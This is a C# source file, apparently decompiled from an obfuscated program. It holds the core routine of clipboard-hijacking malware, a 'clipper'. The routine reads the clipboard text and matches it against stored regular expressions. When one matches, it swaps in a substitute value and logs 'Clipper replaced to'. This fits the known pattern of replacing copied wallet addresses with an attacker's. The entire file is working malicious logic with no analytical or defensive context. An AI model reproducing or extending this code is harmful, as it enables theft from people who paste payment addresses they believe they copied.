using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using ns14;
using ns2;

namespace ns17;

internal sealed class Class83
{
	public static void smethod_0()
	{
		string string_ = Class60.string_1;
		if (string.IsNullOrEmpty(string_))
		{
			return;
		}
		foreach (KeyValuePair<string, Regex> item in Class85.dictionary_0)
		{
			string key = item.Key;
			if (item.Value.Match(string_).Success)
			{
				string text = Class8.dictionary_0[key];
				if (!string.IsNullOrEmpty(text) && !string_.Equals(text))
				{
					Class80.smethod_1(text);
					Console.WriteLine("Clipper replaced to " + text);
					break;
				}
			}
		}
	}
}
